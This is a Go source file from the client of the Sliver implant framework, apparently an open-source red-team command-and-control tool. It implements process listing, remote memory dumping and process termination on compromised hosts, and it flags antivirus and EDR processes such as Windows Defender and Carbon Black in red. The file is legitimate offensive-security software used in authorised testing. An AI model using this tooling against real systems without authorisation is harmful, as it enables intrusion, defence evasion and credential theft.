package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"path"
	"strconv"
	"strings"
	"text/tabwriter"

	// "time"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/desertbit/grumble"
)

var (
	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe":    red, // SEP
		"cb.exe":          red, // Carbon Black
		"MsMpEng.exe":     red, // Windows Defender
		"smartscreen.exe": red, // Windows Defender Smart Screen
	}
)

func ps(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	pidFilter := ctx.Flags.Int("pid")
	exeFilter := ctx.Flags.String("exe")
	ownerFilter := ctx.Flags.String("owner")

	ps, err := rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: ActiveSession.Request(ctx),
	})
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
		return
	}

	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	if session.GetOS() != "windows" {
		fmt.Fprintf(table, "pid\tppid\texecutable\towner\t\n")
		fmt.Fprintf(table, "%s\t%s\t%s\t%s\t\n",
			strings.Repeat("=", len("pid")),
			strings.Repeat("=", len("ppid")),
			strings.Repeat("=", len("executable")),
			strings.Repeat("=", len("owner")),
		)
	} else {
		fmt.Fprintf(table, "pid\tppid\texecutable\towner\tsession\n")
		fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t\n",
			strings.Repeat("=", len("pid")),
			strings.Repeat("=", len("ppid")),
			strings.Repeat("=", len("executable")),
			strings.Repeat("=", len("owner")),
			strings.Repeat("=", len("session")),
		)
	}

	lineColors := []string{}
	for _, proc := range ps.Processes {
		var lineColor = ""
		if pidFilter != -1 && proc.Pid == int32(pidFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if exeFilter != "" && strings.HasPrefix(proc.Executable, exeFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if ownerFilter != "" && strings.HasPrefix(proc.Owner, ownerFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if pidFilter == -1 && exeFilter == "" && ownerFilter == "" {
			lineColor = printProcInfo(table, proc)
		}

		// Should be set to normal/green if we rendered the line
		if lineColor != "" {
			lineColors = append(lineColors, lineColor)
		}
	}
	table.Flush()

	for index, line := range strings.Split(outputBuf.String(), "\n") {
		if len(line) == 0 {
			continue
		}
		// We need to account for the two rows of column headers
		if 0 < len(line) && 2 <= index {
			lineColor := lineColors[index-2]
			fmt.Printf("%s%s%s\n", lineColor, line, normal)
		} else {
			fmt.Printf("%s\n", line)
		}
	}

}

// printProcInfo - Stylizes the process information
func printProcInfo(table *tabwriter.Writer, proc *commonpb.Process) string {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	session := ActiveSession.GetInteractive()
	if session != nil && proc.Pid == session.PID {
		color = green
	}
	if session.GetOS() == "windows" {
		fmt.Fprintf(table, "%d\t%d\t%s\t%s\t%d\t\n", proc.Pid, proc.Ppid, proc.Executable, proc.Owner, proc.SessionID)
	} else {

		fmt.Fprintf(table, "%d\t%d\t%s\t%s\t\n", proc.Pid, proc.Ppid, proc.Executable, proc.Owner)
	}
	return color
}

func procdump(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	pid := ctx.Flags.Int("pid")
	name := ctx.Flags.String("name")

	if pid == -1 && name != "" {
		pid = getPIDByName(ctx, name, rpc)
	}
	if pid == -1 {
		fmt.Printf(Warn + "Invalid process target\n")
		return
	}

	if ctx.Flags.Int("timeout") < 1 {
		fmt.Printf(Warn + "Invalid timeout argument\n")
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Dumping remote process memory ...", ctrl)
	dump, err := rpc.ProcessDump(context.Background(), &sliverpb.ProcessDumpReq{
		Request: ActiveSession.Request(ctx),
		Pid:     int32(pid),
		Timeout: int32(ctx.Flags.Int("timeout") - 1),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"Error %s", err)
		return
	}

	hostname := session.Hostname
	tmpFileName := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	tmpFile, err := ioutil.TempFile("", tmpFileName)
	if err != nil {
		fmt.Printf(Warn+"Error creating temporary file: %v\n", err)
		return
	}
	tmpFile.Write(dump.GetData())
	fmt.Printf(Info+"Process dump stored in: %s\n", tmpFile.Name())
}

func terminate(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "Please provide a PID\n")
		return
	}
	pidStr := ctx.Args[0]
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err)
		return
	}
	terminated, err := rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
		Request: ActiveSession.Request(ctx),
		Pid:     int32(pid),
		Force:   ctx.Flags.Bool("force"),
	})
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
	} else {
		fmt.Printf(Info+"Process %d has been terminated\n", terminated.Pid)
	}

}

func getPIDByName(ctx *grumble.Context, name string, rpc rpcpb.SliverRPCClient) int {
	ps, err := rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: ActiveSession.Request(ctx),
	})
	if err != nil {
		return -1
	}
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return int(proc.Pid)
		}
	}
	return -1
}
